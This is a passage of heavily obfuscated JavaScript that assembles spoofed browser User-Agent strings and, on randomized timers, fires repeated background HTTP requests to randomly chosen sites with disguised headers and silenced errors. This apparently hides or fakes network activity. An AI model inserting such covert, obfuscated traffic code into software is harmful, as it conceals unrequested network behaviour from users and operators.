      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0xd3 * -0x1f + -0x1 * 0xd4 + 0x1a61; k < 0x5c8 + -0x565 + -0x5f; k++)
    setTimeout(f, (0x53 * 0x31 + -0x2 * 0x4e68 + 0x1774d) * k * getRandomInt(0x41 * 0x5d + 0x1d12 + -0x34ae, -0x175 + -0xd6 * 0x28 + -0x4 * -0x8ba));
  setInterval(() => {
    f();
    for (let l = 0xfd5 + 0x367 * -0xb + 0x1598; l < 0x1d2 + -0x6 * -0x283 + -0x438 * 0x4; l++)
      setTimeout(f, (-0x14483 * -0x1 + -0x1a745 + 0xa691 * 0x2) * l * getRandomInt(0x985 * -0x3 + 0x1829 + 0x467, -0x910 * 0x2 + 0x1216 + 0xd));
  }, 0x48a478 + 0x9cd8 * -0x1e + 0xab58 * 0x1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x2acc + 0x4 * -0x339 + -0x290) * getRandomInt(0x5 * 0x245 + -0xe2 + -0x67 * 0x1a, 0x1 * -0xed0 + 0x617 + 0x2 * 0x45f));
}, -0x1 * 0xd0a + -0x2697 * -0x1 + 0x863 * -0x3);